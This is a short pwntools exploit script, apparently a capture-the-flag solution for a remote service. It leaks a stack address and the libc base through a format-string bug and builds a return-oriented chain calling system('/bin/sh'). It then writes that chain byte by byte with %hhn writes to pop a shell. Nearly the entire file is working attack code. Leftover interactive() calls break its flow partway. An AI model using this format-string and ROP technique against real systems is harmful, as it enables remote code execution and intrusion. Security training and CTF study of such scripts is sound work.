import pwn

pwn.context.update(arch="amd64", os="linux")
# log everything
# pwn.log.level = "debug"

# %p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.

# stack.libc
# %250$p.%273$p.
# patchelf --set-rpath . --set-interpreter ./ld-linux-x86-64.so.2 main

# r = pwn.process("./main", aslr=False)
r = pwn.remote("amt.rs", 36467)

r.sendlineafter(b"> ", open("min.c", "rb").read())
r.interactive()

r.sendline(b"%250$p.%273$p.")
m = r.recvregex(br"([0-9a-fx]+)\.([0-9a-fx]+)\.", capture=True)
retaddr = int(m.group(1), 16) + 0x858
libc_address = int(m.group(2), 16) - 0x11ca

pop_rdi = 0x1765
bin_sh = 0x170031
system = 0x263a0

pwn.log.info(f"{retaddr=:#x}")
pwn.log.info(f"{libc_address=:#x}")

chain = pwn.p64(libc_address + pop_rdi)
chain += pwn.p64(libc_address + bin_sh)
chain += pwn.p64(libc_address + pop_rdi + 1)
chain += pwn.p64(libc_address + system)

r.interactive()

for i in range(32):
    r.sendline(hex(retaddr+i).encode())
    r.sendline(b'A'*chain[i]+b'%40$hhn')

r.interactive()
